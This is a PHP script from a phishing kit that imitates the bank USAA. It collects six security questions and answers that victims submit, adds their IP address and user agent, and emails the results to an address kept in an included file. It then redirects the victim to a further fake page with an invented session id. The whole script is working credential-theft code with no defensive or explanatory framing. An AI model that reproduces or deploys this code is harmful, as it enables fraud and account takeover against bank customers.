<?php
if($_POST["qq1"] != "" and $_POST["ans1"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------USAA Questions-----------------------\n";
$message .= "|Question1 : ".$_POST['qq1']."\n";
$message .= "|Answer1 : ".$_POST['ans1']."\n";
$message .= "|Question2 : ".$_POST['qq2']."\n";
$message .= "|Answer2 : ".$_POST['ans2']."\n";
$message .= "|Question3 : ".$_POST['qq3']."\n";
$message .= "|Answer3 : ".$_POST['ans3']."\n";
$message .= "|Question4 : ".$_POST['qq4']."\n";
$message .= "|Answer4 : ".$_POST['ans4']."\n";
$message .= "|Question5 : ".$_POST['qq5']."\n";
$message .= "|Answer5: ".$_POST['ans5']."\n";
$message .= "|Question6 : ".$_POST['qq6']."\n";
$message .= "|Answer6 : ".$_POST['ans6']."\n";
 
$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'fillin.php';
$subject = "Result from USAA| ".$ip."\n";
 
{
mail("$to", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
header('Location: details.php?cmd=login_submit&id=$praga$praga&session=$praga$praga');
}else{
header ("Location: index.php");
}

?>


   